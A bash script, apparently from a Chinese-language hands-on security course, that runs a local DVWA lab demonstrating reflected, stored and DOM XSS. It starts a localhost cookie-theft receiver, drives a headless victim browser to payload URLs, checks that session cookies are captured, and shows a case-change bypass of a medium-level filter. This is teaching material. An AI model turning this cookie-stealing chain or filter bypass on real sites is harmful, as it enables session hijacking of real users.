#!/usr/bin/env bash
# =============================================================================
# 14 · XSS 三种类型实战 —— 反射/存储/DOM payload / headless 受害浏览器 / cookie 窃取接收端
# 用法: ./xss_lab.sh [apply|observe|clean|all]   (默认 all)
# 前置: 实验 12 的 DVWA 栈；flask（接收端）；node + puppeteer-core（受害浏览器）
# =============================================================================
set -euo pipefail
cd "$(dirname "$0")"                      # 任意 cwd 运行都正确

PY="${PYTHON:-python3}"
ART="artifacts"
RECV_PORT="${RECV_PORT:-8600}"
COOKIE="$ART/cookie.txt"
PIDFILE="/tmp/hosec14-recv.pid"
NODE_MODULES="$HOME/.agents/skills/hands-on-series/scripts/node_modules"

step() { echo; echo "=====> [$1] $2"; }
ok()   { echo "  ✅ $*"; }
die()  { echo "  ❌ $*" >&2; exit 1; }

recv_up() {
    [ "$(curl -s -o /dev/null -w '%{http_code}' --max-time 2 \
        "http://127.0.0.1:${RECV_PORT}/ping" || true)" = "200" ]
}
visit() {  # $1=受害 URL
    NODE_PATH="$NODE_MODULES" node configs/visit.js "$1" "$(cat "$COOKIE")" 2000
}
assert_captures() {  # $1=最少条数 $2=场景名
    "$PY" xss_lab.py captures --min "$1" > "$ART/captures.out" || \
        die "${2}：接收端未收到预期回调（期望 ≥$1）"
    grep -q "PHPSESSID" "$ART/captures.out" || die "${2}：回调里没有 PHPSESSID"
}

do_apply() {
    step "apply" "拉起 DVWA + 启动窃取接收端 + 登录取会话"
    mkdir -p "$ART"
    "$PY" -c "import flask, requests" 2>/dev/null \
        || die "缺少依赖：pip3 install flask requests"
    ../12_dvwa/dvwa.sh apply | tail -2
    if [ -f "$PIDFILE" ] && kill -0 "$(cat "$PIDFILE")" 2>/dev/null; then
        ok "接收端已在运行 (PID $(cat "$PIDFILE"))，直接复用"
    else
        rm -f "$PIDFILE" "$ART/receiver.log"
        "$PY" xss_receiver.py --port "$RECV_PORT" > /tmp/hosec14-recv.log 2>&1 &
        echo $! > "$PIDFILE"
        disown 2>/dev/null || true
        local i
        for i in $(seq 1 20); do
            recv_up && break
            sleep 0.2
        done
        recv_up || { tail -3 /tmp/hosec14-recv.log 2>/dev/null || true; die "接收端未就绪（端口 ${RECV_PORT}）"; }
        ok "窃取接收端就绪：http://127.0.0.1:${RECV_PORT}/steal"
    fi
    "$PY" xss_lab.py session > "$COOKIE"
    grep -q "PHPSESSID" "$COOKIE" || die "登录 cookie 获取失败"
    ok "DVWA 会话就绪（cookie 已存 ${COOKIE}，将喂给受害浏览器）"
}

do_observe() {
    local victim

    step "observe" "① 反射型 XSS（low）：payload 原样回显 + 受害浏览器触发"
    "$PY" xss_lab.py attack reflected --level low | tee "$ART/reflect.out"
    grep -q "原样回显：是" "$ART/reflect.out" || die "反射点未回显 payload"
    victim="$(sed -n 's/.*受害 URL：//p' "$ART/reflect.out")"
    visit "$victim"
    assert_captures 1 "反射型"
    ok "反射 payload 在受害浏览器中执行，接收端拿到 cookie（第 1 条回调）"

    step "observe" "② 存储型 XSS（low）：留言板投毒，访客自动中标"
    "$PY" xss_lab.py attack stored --level low | tee "$ART/stored.out"
    grep -q "页面含未转义 payload：是" "$ART/stored.out" || die "payload 未存储"
    victim="$(sed -n 's/.*受害 URL：//p' "$ART/stored.out")"
    visit "$victim"
    assert_captures 2 "存储型"
    ok "存储 payload 随页面加载执行（第 2 条回调）——这是「主动拜访」变「被动中招」"

    step "observe" "③ DOM 型 XSS（low）：payload 不经服务端处理，由客户端 JS 执行"
    "$PY" xss_lab.py attack dom | tee "$ART/dom.out"
    victim="$(sed -n 's/.*受害 URL：//p' "$ART/dom.out")"
    visit "$victim"
    assert_captures 3 "DOM 型"
    ok "客户端 JS 把 URL 参数写进页面并执行（第 3 条回调）——服务端响应体里没有 payload，响应检测器看不见"

    step "observe" "④ medium 绕过：大小写变换让 str_replace 过滤失效"
    "$PY" xss_lab.py attack reflected --level medium | tee "$ART/medium.out"
    grep -q "原样回显：是" "$ART/medium.out" || die "medium 绕过失败（<Script> 被过滤）"
    "$PY" xss_lab.py session --level medium > "$COOKIE"   # 受害者也切到 medium 档再看
    victim="$(sed -n 's/.*受害 URL：//p' "$ART/medium.out")"
    visit "$victim"
    assert_captures 4 "medium 绕过"
    "$PY" xss_lab.py session > "$COOKIE"                  # 复位为 low 会话
    ok "medium 的 str_replace 只认小写 <script>——<Script> 绕过并执行成功（第 4 条回调）"

    step "observe" "⑤ 汇总：四次攻击共 4 条回调（每一条都含会话 cookie）"
    "$PY" xss_lab.py captures --min 4
    ok "三类型全触发 + medium 绕过成立；接收端战果见上"
}

do_clean() {
    step "clean" "停止接收端并清理生成物（DVWA 栈保持运行）"
    if [ -f "$PIDFILE" ] && kill -0 "$(cat "$PIDFILE")" 2>/dev/null; then
        kill "$(cat "$PIDFILE")"
        local i
        for i in $(seq 1 20); do
            recv_up || break
            sleep 0.2
        done
    fi
    rm -f "$PIDFILE"
    if recv_up; then die "接收端仍在响应（可能不是本脚本起的进程）"; fi
    rm -rf "$ART"
    ok "接收端已停、产物已清；靶场留着，要拆用 ../12_dvwa/dvwa.sh clean"
}

main() {
    local target="${1:-all}"
    case "$target" in
        apply)   do_apply ;;
        observe) do_observe ;;
        clean)   do_clean ;;
        all)     do_apply; do_observe; do_clean ;;
        *) echo "可用: apply | observe | clean | all" >&2; exit 1 ;;
    esac
}
main "$@"
